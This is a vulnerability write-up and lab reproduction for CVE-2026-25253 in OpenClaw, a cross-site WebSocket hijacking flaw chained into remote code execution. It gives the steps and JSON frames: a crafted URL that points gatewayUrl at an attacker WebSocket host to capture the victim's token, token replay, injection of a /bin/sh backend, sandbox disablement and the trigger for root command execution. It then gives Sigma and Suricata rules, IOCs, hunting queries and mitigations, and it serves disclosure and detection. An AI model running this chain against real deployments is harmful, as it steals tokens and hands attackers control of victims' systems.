# OpenClaw Cross-Site WebSocket Hijacking → RCE (CVE-2026-25253)

| Field | Value |
|-------|-------|
| CVE | CVE-2026-25253 |
| Target | OpenClaw (clawdbot) ≤ 2026.1.28 |
| Vector | Cross-Site WebSocket Hijacking (CSWSH) → Token Leak → Config Injection → RCE |
| CVSS | 9.8 (Critical) |
| MITRE ATT&CK | T1557 (Adversary-in-the-Middle), T1528 (Steal Application Access Token), T1059.004 (Unix Shell) |
| Fix | Upgrade to ≥ 2026.2.1; remove `gatewayUrl` query parameter support |

## 1. Vulnerability Overview

OpenClaw's Control UI accepts a `gatewayUrl` query parameter that overrides the default WebSocket gateway endpoint. When a victim visits a crafted URL, the browser automatically connects to an attacker-controlled WebSocket server and sends the full `connect` frame containing `auth.token`, `role`, `scopes`, and `device` identity. The attacker replays this token to authenticate as the victim, then chains config injection, sandbox disablement, and CLI backend abuse to achieve RCE.

## 2. Attack Chain

```
┌─────────────┐    malicious URL     ┌──────────────┐
│  Attacker   │ ──────────────────── │   Victim     │
│  WS Server  │ ◄── connect frame ── │   Browser    │
└──────┬──────┘   (token leaked)     └──────────────┘
       │
       │ replay token + challenge-response
       ▼
┌──────────────┐  config.patch    ┌──────────────────┐
│   Gateway    │ ◄─────────────── │  Attacker CLI    │
│  (18789)     │  inject backend  │  (authenticated) │
└──────┬───────┘                  └────────┬─────────┘
       │                                   │
       │  exec.approvals.set (sandbox off) │
       │  sessions.patch (model=poc-cli)   │
       │  agent → spawn /bin/sh            │
       ▼                                   ▼
┌──────────────────────────────────────────────────┐
│              RCE as root in container             │
└──────────────────────────────────────────────────┘
```

## 3. Reproduction

### Environment
```bash
docker compose up -d   # vulhub/openclaw:2026.1.28, port 18789
docker compose logs web | grep "Gateway token"
# Token: d4b7c7689b82981ff86c735a9f8f616b310491b0d334659a1491c55a13353e66
```

### Step 1 — CSWSH Token Capture (simulated)

Attacker crafts URL: `http://target:18789/?gatewayUrl=ws://attacker:8080`

When victim visits this URL in the same browser where Control UI is active, the browser connects to the attacker's WebSocket server and sends the full `connect` frame:

```json
{
  "method": "connect",
  "params": {
    "minProtocol": 1, "maxProtocol": 10,
    "auth": {"token": "d4b7c7689b82981ff86c735a9f8f616b310491b0d334659a1491c55a13353e66"},
    "client": {"id": "clawdbot-control-ui", "version": "1.0.0"},
    "device": {"id": "...", "publicKey": "..."}
  }
}
```

### Step 2 — Authenticate with Stolen Token

Connect to real gateway, complete HMAC-SHA256 challenge-response:

```python
response = hmac.new(token.encode(), nonce.encode(), hashlib.sha256).hexdigest()
```

### Step 3 — Inject Malicious CLI Backend (config.patch)

```json
{"method": "config.patch", "params": {"raw": "{\"agents\":{\"defaults\":{\"cliBackends\":{\"poc-cli\":{\"command\":\"/bin/sh\",\"args\":[\"-c\",\"id > /tmp/vulhub_rce_proof 2>&1\"],\"input\":\"arg\",\"sessionMode\":\"none\"}}}}}"}}
```

### Step 4 — Disable Sandbox (exec.approvals.set)

```json
{"method": "exec.approvals.set", "params": {"file": {"version": 1, "defaults": {"security": "full", "ask": "off"}}}}
```

### Step 5 — Set Session Model to CLI Backend (sessions.patch)

```json
{"method": "sessions.patch", "params": {"key": "main", "model": "poc-cli/default"}}
```

### Step 6 — Trigger RCE (agent)

```json
{"method": "agent", "params": {"message": "run", "agentId": "main", "sessionKey": "agent:main:main"}}
```

### Result

```
$ docker exec cve-2026-25253-web-1 cat /tmp/vulhub_rce_proof
uid=0(root) gid=0(root) groups=0(root)
```

## 4. Lessons Learned

- WebSocket endpoints must validate the `Origin` header to prevent CSWSH
- URL-based configuration overrides (query params) should never control security-critical endpoints
- Challenge-response alone is insufficient if the token can be leaked via CSWSH first
- Defense-in-depth: sandbox policies should not be modifiable via the same auth context

## 5. Defense & Detection

### 5.1 Sigma Rules

```yaml
title: OpenClaw CSWSH — Suspicious gatewayUrl Parameter in HTTP Request
id: bf7h4d56-8c2f-6e6i-e5g0-3f9h1i6d2e45
status: experimental
description: Detects HTTP requests to OpenClaw Control UI containing a gatewayUrl query parameter, indicating potential CSWSH attack setup.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-25253
  - https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq
author: Security Lab
date: 2026/05/21
tags:
  - attack.credential_access
  - attack.t1528
  - cve.2026.25253
logsource:
  category: webserver
  product: any
detection:
  selection:
    cs-uri-query|contains: 'gatewayUrl='
    cs-uri-path|startswith: '/'
  condition: selection
falsepositives:
  - Legitimate developer testing with custom gateway endpoints
  - Internal tooling that programmatically overrides gateway URL
level: high
---
title: OpenClaw CSWSH — WebSocket Connect Frame to External Endpoint
id: bf7h4d56-8c2f-6e6i-e5g0-3f9h1i6d2e46
status: experimental
description: Detects WebSocket upgrade requests from OpenClaw Control UI to non-localhost endpoints, indicating token exfiltration via CSWSH.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-25253
author: Security Lab
date: 2026/05/21
tags:
  - attack.credential_access
  - attack.t1557
  - cve.2026.25253
logsource:
  category: proxy
  product: any
detection:
  selection:
    r-dns|not_startswith:
      - '127.0.0.'
      - 'localhost'
    cs-method: 'GET'
    cs-uri|contains: 'upgrade=websocket'
  filter_internal:
    r-dns|startswith:
      - '10.'
      - '192.168.'
      - '172.'
  condition: selection and not filter_internal
falsepositives:
  - Cloud-hosted OpenClaw deployments connecting to external gateway
level: medium
```

### 5.2 Suricata Rules

```
alert http any any -> $HOME_NET 18789 (msg:"CVE-2026-25253 OpenClaw CSWSH gatewayUrl Override Attempt"; flow:to_server,established; content:"GET"; http_method; content:"gatewayUrl="; http_uri; content:"ws"; http_uri; reference:cve,2026-25253; classtype:web-application-attack; sid:2026025253; rev:1;)

alert tcp any any -> $HOME_NET 18789 (msg:"CVE-2026-25253 OpenClaw WebSocket config.patch Injection"; flow:to_server,established; content:"config.patch"; content:"cliBackends"; within:200; content:"/bin/sh"; within:100; reference:cve,2026-25253; classtype:web-application-attack; sid:2026025254; rev:1;)

alert tcp any any -> $HOME_NET 18789 (msg:"CVE-2026-25253 OpenClaw WebSocket exec.approvals.set Sandbox Disable"; flow:to_server,established; content:"exec.approvals.set"; content:"|22|ask|22|"; within:100; content:"|22|off|22|"; within:20; reference:cve,2026-25253; classtype:web-application-attack; sid:2026025255; rev:1;)
```

### 5.3 IOC Table

| Type | Value | Context |
|------|-------|---------|
| URL Pattern | `/?gatewayUrl=ws://` | CSWSH trigger URL |
| WebSocket Method | `config.patch` with `cliBackends` | CLI backend injection |
| WebSocket Method | `exec.approvals.set` with `ask: "off"` | Sandbox disablement |
| WebSocket Method | `sessions.patch` with external `model` | Provider override |
| File | `/tmp/vulhub_rce_proof` | RCE proof artifact |
| Config Key | `agents.defaults.cliBackends.*` | Injected backend |
| Behavior | Gateway restart (WS close code 1012) after config.patch | Post-exploitation indicator |

### 5.4 SIEM Hunting Queries

**Splunk SPL**

```spl
index=web sourcetype=access_combined
| where like(uri_query, "%gatewayUrl=%") AND like(uri_query, "%ws%3A%2F%2F%") OR like(uri_query, "%ws://%")
| stats count by src_ip, dest_ip, uri_path, uri_query
| where count > 0
| sort -count
```

```spl
index=network sourcetype=websocket OR sourcetype=proxy
| where match(payload, "config\.patch.*cliBackends") OR match(payload, "exec\.approvals\.set.*ask.*off")
| stats count values(payload) as methods by src_ip, dest_ip, dest_port
| where dest_port=18789
```

**Microsoft Sentinel KQL**

```kql
// Detect CSWSH trigger URL with gatewayUrl parameter
CommonSecurityLog
| where DeviceAction == "GET"
| where RequestURL has "gatewayUrl=" and RequestURL has "ws"
| where DestinationPort == 18789
| project TimeGenerated, SourceIP, RequestURL, DeviceAction
| sort by TimeGenerated desc
```

```kql
// Detect WebSocket-based config injection and sandbox disable
NetworkSessions
| where DstPortNumber == 18789
| where NetworkPayload has_any ("config.patch", "exec.approvals.set", "cliBackends")
| where NetworkPayload has_any ("/bin/sh", "ask", "off", "security", "full")
| project TimeGenerated, SrcIpAddr, DstIpAddr, NetworkPayload
| sort by TimeGenerated desc
```

### 5.5 Mitigation

1. **Upgrade** to OpenClaw ≥ 2026.2.1 which removes `gatewayUrl` query parameter support
2. **Origin validation**: Deploy reverse proxy that validates WebSocket `Origin` header matches expected domain
3. **CSP header**: Add `connect-src 'self' ws://localhost:*` to prevent connections to external WebSocket endpoints
4. **Network segmentation**: Restrict outbound WebSocket connections from hosts running OpenClaw
5. **Token rotation**: Enable automatic token rotation on gateway restart to invalidate leaked tokens
